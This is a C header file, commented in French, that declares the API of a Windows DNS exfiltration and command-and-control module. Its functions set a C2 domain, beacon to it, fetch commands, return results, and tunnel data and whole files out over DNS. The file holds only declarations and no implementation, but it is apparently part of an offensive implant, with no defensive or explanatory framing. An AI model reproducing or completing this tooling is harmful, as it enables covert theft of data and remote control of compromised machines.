/**
 * @file dns_exfil.h
 * @brief Header DNS Exfiltration
 */

#ifndef DNS_EXFIL_H
#define DNS_EXFIL_H

#include <windows.h>

// Configuration
void DNS_SetC2Domain(const char* domain);

// Exfiltration de données
BOOL DNS_Exfil_Send(const BYTE* data, DWORD data_len, const char* session_id);
DWORD DNS_Exfil_Recv(const char* session_id, BYTE* output, DWORD max_len);

// Beacon C2
DWORD DNS_Beacon(const char* agent_id);
DWORD DNS_GetCommand(const char* agent_id, DWORD cmd_id, BYTE* output, DWORD max_len);
BOOL DNS_SendResult(const char* agent_id, DWORD cmd_id, const BYTE* data, DWORD data_len);

// Exfiltration fichiers
BOOL DNS_ExfilFile(const char* filepath, const char* session_id);

// Utilitaires
void DNS_GenerateSessionId(char* output, DWORD max_len);
BOOL DNS_CheckConnectivity(void);

#endif // DNS_EXFIL_H
